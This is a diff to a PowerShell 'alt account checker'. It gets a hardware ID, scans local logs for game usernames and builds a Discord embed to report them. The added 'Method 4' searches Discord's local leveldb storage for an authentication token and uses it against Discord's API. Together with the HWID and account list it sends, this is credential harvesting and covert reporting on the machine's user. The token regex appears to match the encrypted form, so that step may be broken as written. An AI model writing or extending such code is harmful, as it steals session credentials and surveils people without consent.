@@ -26,7 +26,7 @@ function Get-HWID {
 
 $hwid = Get-HWID
 
-# Get Discord username from multiple sources
+# Get Discord username from multiple sources (improved)
 function Get-DiscordUsername {
     $username = "Unknown"
     
@@ -49,6 +49,10 @@ function Get-DiscordUsername {
                 if ($content -match '"tag":"([^"]+)"') {
                     $username = $Matches[1]
                     return $username
+                }
+                # Look for email or user ID patterns
+                if ($content -match '"user_id":"([^"]+)"') {
+                    # If we find user_id but not username, we can try to get it from Discord API later
                 }
             }
         }
@@ -74,6 +78,24 @@ function Get-DiscordUsername {
             if ($localState -match '"username":"([^"]+)"') {
                 $username = $Matches[1]
                 return $username
+            }
+        }
+    } catch {}
+    
+    # Method 4: Check for Discord token to get username from API
+    try {
+        $tokenFiles = Get-ChildItem -Path "$env:APPDATA\discord\Local Storage\leveldb" -Filter "*.log" -ErrorAction SilentlyContinue
+        foreach ($file in $tokenFiles) {
+            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+            if ($content -match 'dQw4w9WgXcQ:[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}') {
+                $token = $Matches[0]
+                try {
+                    $userInfo = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers @{Authorization = $token} -ErrorAction SilentlyContinue
+                    if ($userInfo.username) {
+                        $username = $userInfo.username
+                        return $username
+                    }
+                } catch {}
             }
         }
     } catch {}
@@ -108,6 +130,7 @@ $logFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.log" -File -Force
 $allFiles = @($gzFiles) + @($logFiles)
 
 $newAlts = @()
+$allFoundAlts = @()
 
 foreach ($file in $allFiles) {
     try {
@@ -137,6 +160,7 @@ foreach ($file in $allFiles) {
         $pattern = "Setting user:\s*(\S+)"
         if ($content -and $content -match $pattern) {
             $username = $Matches[1]
+            $allFoundAlts += $username
             if (-not $storedAlts.ContainsKey($username)) {
                 $newAlts += $username
             }
@@ -159,45 +183,60 @@ if ($newAlts.Count -gt 0) {
     Set-Content -Path $hwidFile -Value $encrypted -Force
 }
 
-# Always send a message, even if no new alts
+# Always show alts and Discord username
+$description = "**Discord Account:** $discordUser`n`n"
+
 if ($newAlts.Count -gt 0) {
     Write-Host "`nNew alts found:" -ForegroundColor Cyan
     $counter = 1
-    $description = "**Discord Account:** $discordUser`n`n"
+    $description += "**NEW ALTS FOUND:**`n`n"
     foreach ($username in $newAlts | Select-Object -Unique) {
         Write-Host ("  {0}. {1}" -f $counter, $username) -ForegroundColor Magenta
         $description += "$counter. $username`n"
         $counter++
     }
     
-    # Create embed for new alts
-    $embed = @{
-        title = "ALT ACCOUNTS DETECTED"
-        color = 0x9B59B6
-        description = $description
-        footer = @{
-            text = "HWID: $hwid"
+    if ($storedAlts.Count - $newAlts.Count -gt 0) {
+        $description += "`n**PREVIOUSLY DETECTED ALTS:**`n`n"
+        $counter = 1
+        $oldAlts = $storedAlts.Keys | Where-Object { $_ -notin $newAlts }
+        foreach ($username in $oldAlts) {
+            $description += "$counter. $username`n"
+            $counter++
         }
-        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
     }
+    
+    $title = "ALT ACCOUNTS DETECTED"
+    $color = 0x9B59B6
 } else {
     Write-Host "No new alts found." -ForegroundColor Yellow
+    $description += "**NO NEW ALTS FOUND**`n`n"
     
-    # Create embed for no new alts
-    $description = "**Discord Account:** $discordUser`n`nNo new alt accounts were found on this system."
     if ($storedAlts.Count -gt 0) {
-        $description += "`n`nPreviously detected alts: $($storedAlts.Count) total"
+        $description += "**PREVIOUSLY DETECTED ALTS:**`n`n"
+        $counter = 1
+        foreach ($username in $storedAlts.Keys) {
+            Write-Host ("  {0}. {1}" -f $counter, $username) -ForegroundColor Magenta
+            $description += "$counter. $username (First seen: $($storedAlts[$username]))`n"
+            $counter++
+        }
+    } else {
+        $description += "No alt accounts have ever been detected on this system."
     }
     
-    $embed = @{
-        title = "ALT ACCOUNTS CHECK"
-        color = 0x3498DB
-        description = $description
-        footer = @{
-            text = "HWID: $hwid"
-        }
-        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+    $title = "ALT ACCOUNTS CHECK"
+    $color = 0x3498DB
+}
+
+# Create embed
+$embed = @{
+    title = $title
+    color = $color
+    description = $description
+    footer = @{
+        text = "HWID: $hwid"
     }
+    timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
 }
 
 # Send to Discord
